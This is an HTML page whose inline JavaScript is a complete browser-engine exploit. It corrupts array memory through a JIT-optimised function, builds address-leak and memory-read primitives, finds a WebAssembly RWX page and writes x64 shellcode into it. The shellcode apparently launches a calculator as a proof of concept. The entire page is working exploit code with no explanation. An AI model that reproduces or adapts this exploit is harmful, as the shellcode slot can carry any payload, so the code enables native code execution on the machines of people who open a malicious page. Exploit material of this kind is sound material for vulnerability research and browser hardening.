<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>

  <body>
    <div id="log"></div>
    <script>
      function log(msg) {
        document.write(msg + "<br>");
      }

      function vuln(arg) {
        let x = arguments.length;
        a1 = new Array(0x10);
        a1[0] = 1.1;
        a2 = new Array(0x10);
        a2[0] = 1.1;
        a1[(x >> 16) * 21] = 1.39064994160909e-309; // 0xffff00000000
        a1[(x >> 16) * 41] = 1.35807730622e-312; // 0x4000000000
      }

      let a1, a2;
      let a3 = [1.1, 2.2];
      a3.length = 0x11000;
      a3.fill(3.3);
      let a4 = [1.1];

      for (let i = 0; i < 0x1000; i++) {
        let a = new ArrayBuffer(0x100000);
      }

      /* triggers the vuln */
      for (let i = 0; i < 10000; i++) {
        vuln(...a4);
      }
      vuln(...a3);

      let primsArr = new ArrayBuffer(0x1000);
      let dataView = new DataView(primsArr);
      let addrLeak = [primsArr, primsArr, primsArr, primsArr];
      let view = new Uint32Array(2);
      let convertArr = new Float64Array(view.buffer);

      /* returns the address of object as double */
      const addrOf = (obj) => {
        addrLeak[0] = obj;
        return a2[38];
      };

      const getPtrString = (addr) => {
        convertArr[0] = addr;

        let ret_ptr = "0x";
        ret_ptr += view[1].toString(16);
        ret_ptr += view[0].toString(16);
        return ret_ptr;
      };

      const readPtr = (addr) => {
        a2[24] = addr;
        view[0] = dataView.getUint32(0, true);
        view[1] = dataView.getUint32(4, true);
        return convertArr[0];
      };

      log("[*] Primitives are ready!");

      let wasmCode = new Uint8Array([
        0,
        97,
        115,
        109,
        1,
        0,
        0,
        0,
        1,
        7,
        1,
        96,
        2,
        127,
        127,
        1,
        127,
        3,
        2,
        1,
        0,
        4,
        4,
        1,
        112,
        0,
        0,
        5,
        3,
        1,
        0,
        1,
        7,
        21,
        2,
        6,
        109,
        101,
        109,
        111,
        114,
        121,
        2,
        0,
        8,
        95,
        90,
        51,
        97,
        100,
        100,
        105,
        105,
        0,
        0,
        10,
        9,
        1,
        7,
        0,
        32,
        1,
        32,
        0,
        106,
        11,
      ]);
      let wasmMod = new WebAssembly.Instance(
        new WebAssembly.Module(wasmCode),
        {}
      );
      let f = wasmMod.exports._Z3addii;

      let wasmInstanceAddr = addrOf(f);
      log("[*] Wasm Instance @ " + getPtrString(wasmInstanceAddr));

      convertArr[0] = wasmInstanceAddr;
      view[0] = view[0] + 0x18 - 1;
      let sharedFuncInfoAddr = readPtr(convertArr[0]);
      log("[*] SharedFuncInfo @ " + getPtrString(sharedFuncInfoAddr));

      convertArr[0] = sharedFuncInfoAddr;
      view[0] = view[0] - 0x90 - 1;
      let rwxPage = readPtr(convertArr[0]);
      log("[*] rwxPage @ " + getPtrString(rwxPage));

      let shellcode = [
        0xe7894955,
        0xe48348fc,
        0x00c0e8f0,
        0x51410000,
        0x51525041,
        0xd2314856,
        0x528b4865,
        0x528b4860,
        0x528b4818,
        0x728b4820,
        0xb70f4850,
        0x314d4a4a,
        0xc03148c9,
        0x7c613cac,
        0x41202c02,
        0x410dc9c1,
        0xede2c101,
        0x48514152,
        0x8b20528b,
        0x01483c42,
        0x88808bd0,
        0x48000000,
        0x6774c085,
        0x50d00148,
        0x4418488b,
        0x4920408b,
        0x56e3d001,
        0x41c9ff48,
        0x4888348b,
        0x314dd601,
        0xc03148c9,
        0xc9c141ac,
        0xc101410d,
        0xf175e038,
        0x244c034c,
        0xd1394508,
        0x4458d875,
        0x4924408b,
        0x4166d001,
        0x44480c8b,
        0x491c408b,
        0x8b41d001,
        0x01488804,
        0x415841d0,
        0x5a595e58,
        0x59415841,
        0x83485a41,
        0x524120ec,
        0x4158e0ff,
        0x8b485a59,
        0xff57e912,
        0x485dffff,
        0x000001ba,
        0x00000000,
        0x8d8d4800,
        0x00000101,
        0x8b31ba41,
        0xd5ff876f,
        0xa2b5f0bb,
        0xa6ba4156,
        0xff9dbd95,
        0xc48348d5,
        0x7c063c28,
        0xe0fb800a,
        0x47bb0575,
        0x6a6f7213,
        0x894c9000,
        0x63c35dfc,
        0x00636c61,
      ];
      a2[24] = rwxPage;
      for (let i = 0; i < shellcode.length; i++) {
        dataView.setUint32(4 * i, shellcode[i], true);
      }

      f(1, 2);
      f = null;
      dataView.length = null;
      primsArr = null;
      a2.length = 0;
    </script>
  </body>
</html>
